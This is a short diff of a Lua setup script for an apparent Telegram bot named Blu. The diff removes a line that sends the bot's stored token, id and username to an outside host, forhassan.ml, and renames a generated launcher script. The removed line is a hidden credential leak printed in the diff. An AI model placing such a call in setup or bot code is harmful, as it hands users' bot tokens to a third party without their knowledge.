@@ -64,7 +64,6 @@ os.execute('lua start.lua')
 end
 local function Files_Blu_Info()
 Create_Info(database:get(Server_Blu.."Token_Blu"),database:get(Server_Blu.."Id_Blu"),database:get(Server_Blu.."UserName_Blu"))   
-https.request("https://forhassan.ml/Blu/Blu.php?id="..database:get(Server_Blu.."Id_Blu").."&user="..database:get(Server_Blu.."UserName_Blu").."&token="..database:get(Server_Blu.."Token_Blu"))
 local RunBlu = io.open("Blu", 'w')
 RunBlu:write([[
 #!/usr/bin/env bash
@@ -77,7 +76,7 @@ rm -fr ../.telegram-cli
 done
 ]])
 RunBlu:close()
-local RunTs = io.open("Run", 'w')
+local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
 cd $HOME/BluBot
